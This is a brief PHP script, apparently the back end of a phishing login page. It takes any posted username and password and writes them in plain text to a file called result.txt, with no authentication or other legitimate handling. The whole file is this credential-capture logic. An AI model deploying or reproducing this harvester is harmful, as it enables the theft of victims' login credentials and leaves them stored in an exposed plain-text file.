<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    // Retrieve the username and password from the POST request
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Combine username and password into a string
    $data = "Username: $username\nPassword: $password\n";

    // Write the data to a file named "result.txt"
    file_put_contents("result.txt", $data);

} 
?>
